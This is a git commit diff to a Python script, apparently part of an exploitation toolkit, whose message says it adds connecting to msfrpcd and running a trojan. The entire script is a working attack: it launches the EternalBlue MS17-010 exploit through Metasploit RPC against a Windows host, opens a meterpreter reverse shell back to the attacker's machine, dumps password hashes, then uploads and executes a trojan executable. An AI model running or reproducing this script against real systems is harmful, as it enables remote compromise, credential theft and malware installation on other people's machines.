4d5e40ecc5f12bcd5b13f590bea59fedd5016b81
A2ur3 <iridium-satellite@outlook.com>
2020-06-08 22:23:12 +0800

    添加连接msfrpcd及运行木马功能

--- vulnexp/ms17_010.py
+++ vulnexp/ms17_010.py
@@ -1,13 +1,23 @@
 from pymetasploit3.msfrpc import MsfRpcClient
+import os
+import time
+import pymongo
+
+os.system('msfrpcd -P password -S')
+time.sleep(10)
 client = MsfRpcClient('password')
-# from pymetasploit3.msfrpc import MsfRpcClient
-# client = MsfRpcClient('password', port=55552)
+
+
 exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
-exploit['RHOSTS'] = '192.168.1.72'
+exploit['RHOSTS'] = '192.168.186.128'
 payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-payload['LHOST'] = '192.168.1.216'
+payload['LHOST'] = '192.168.186.129'
 payload['LPORT'] = 4444
 exploit.execute(payload=payload)
+
+client.sessions.list # 查看session列表
 shell = client.sessions.session('1')
-shell.write('?')
+shell.write('hashdump')
+shell.write('upload /root/Payloads/muma.exe c:\\')
+shell.write('execute -f c:\\muma.exe')
 print(shell.read())
